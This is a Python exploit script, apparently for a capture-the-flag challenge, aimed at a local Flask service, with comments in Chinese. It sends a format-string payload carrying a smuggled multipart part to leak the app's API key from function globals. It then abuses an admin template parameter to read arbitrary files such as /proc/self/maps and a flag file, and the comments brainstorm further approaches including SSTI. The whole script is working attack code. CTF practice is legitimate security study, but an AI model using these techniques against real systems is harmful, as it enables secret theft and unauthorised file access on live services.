import httpx
import re
import subprocess

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except:
        return "", 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 使用 docker exec 获取 flag 文件名（仅本地测试用）
    print("\n[*] Getting flag filename from container...")
    result = subprocess.run(['docker', 'exec', 'cutter_local', 'ls', '/'], capture_output=True, text=True)
    files = result.stdout.strip().split('\n')
    print(f"Files in /: {files}")
    
    flag_file = [f for f in files if f.startswith('flag-')]
    if flag_file:
        flag_filename = flag_file[0]
        print(f"\n[!] Flag file: {flag_filename}")
        
        # 读取 flag
        content, code = read_file_via_admin(api_key, f"/{flag_filename}")
        print(f"[FLAG] {content}")
    
    # 现在问题是：如何在远程环境不能调用函数的情况下找到 flag 文件名？
    # 
    # 思路1: 利用 /proc/self/maps 查看内存映射
    print("\n[*] Reading /proc/self/maps...")
    content, code = read_file_via_admin(api_key, "/proc/self/maps")
    print(content[:1000])
    
    # 思路2: 利用 /proc/net/unix 查看 unix socket
    print("\n[*] Reading /proc/net/unix...")
    content, code = read_file_via_admin(api_key, "/proc/net/unix")
    # 查找可能包含文件路径的行
    for line in content.split('\n')[:20]:
        if '/' in line:
            print(line)
    
    # 思路3: 尝试通过 SSTI
    # 创建一个包含 Jinja2 payload 的临时文件
    print("\n[*] Creating SSTI test...")
    
    # 检查 /tmp 目录下有什么
    content, code = read_file_via_admin(api_key, "/tmp/")
    print(f"/tmp/ status: {code}")
